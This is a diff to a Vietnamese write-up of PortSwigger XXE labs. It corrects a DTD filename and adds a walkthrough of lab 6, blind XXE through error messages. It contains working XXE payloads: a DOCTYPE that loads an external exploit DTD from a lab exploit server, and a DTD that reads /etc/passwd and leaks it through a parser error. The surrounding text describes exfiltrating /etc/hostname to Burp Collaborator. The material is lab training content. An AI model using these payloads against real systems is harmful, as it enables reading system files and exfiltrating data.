@@ -53,12 +53,12 @@ Ta cấu hình file `exploit.dtd` trong exploit server:
 %exploit;
 ```
 
-Cách hoạt động của `payload.dtd` như sau:
+Cách hoạt động của `exploit.dtd` như sau:
 1) `%file;` sẽ chứa nội dung của file `/etc/hostname`
 2) `%wrapper;` sẽ tạo ra một parameter là exploit
 3) `%exploit;` sẽ gửi request đến Burp Collaborator Server của chúng ta, với path là nội dung của file `/etc/hostname`
 
-Để gọi đến file `payload.dtd` thì trong request `POST /product/stock`, ta khai báo phần DTD với nội dung:
+Để gọi đến file `exploit.dtd` thì trong request `POST /product/stock`, ta khai báo phần DTD với nội dung:
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aed008c038b2807c284bfa8010f0092.exploit-server.net/exploit.dtd"> %xxe;]>
 ```
@@ -70,7 +70,26 @@ Sau khi nhấn send, vào Burp Collaborator kiểm tra thì thấy có request g
 Sử dụng kết quả thu được để submit, thành công.
 
 # 6. Exploiting blind XXE to retrieve data via error messages
+Tương tự như lab #5, website đã chặn general entities, tuy nhiên vẫn cho phép parameter entities. Cấu hình payload như bài 5, tuy nhiên ta sẽ thay đổi nội dung file `exploit.dtd` để exploit.
 
+Thay đổi nội dung `exploit.dtd` thành
+```
+<!ENTITY % file SYSTEM "file:///nonexistence/etc/passwd">
+%file;
+```
+Nhận thấy rằng lỗi `XML parser exited with error: java.io.FileNotFoundException: /nonexistence/etc/passwd (No such file or directory)` xuất hiện.  Như vậy ta có thể exploit thông qua error messages.
+
+Thay đổi nội dung `exploit.dtd` thành
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % wrapper "<!ENTITY &#x25; exploit SYSTEM 'file:///nonexistence/%file;' >">
+%wrapper;
+%exploit;
+```
+
+Kết quả bài lab được giải, nội dung file /etc/passwd được hiển thị.
+
+![image](https://user-images.githubusercontent.com/103978452/208018457-f9d55bac-0a5d-49b2-8ee7-77619090ad90.png)
 
 # 7. Exploiting XInclude to retrieve files
 Ta thấy trong phần body của request `POST /product/stock` chỉ chứa hai tham số productId và storeId. Như vậy ta giả sữ giá trị của productId sẽ được đưa vào một đoạn xml ở server side.
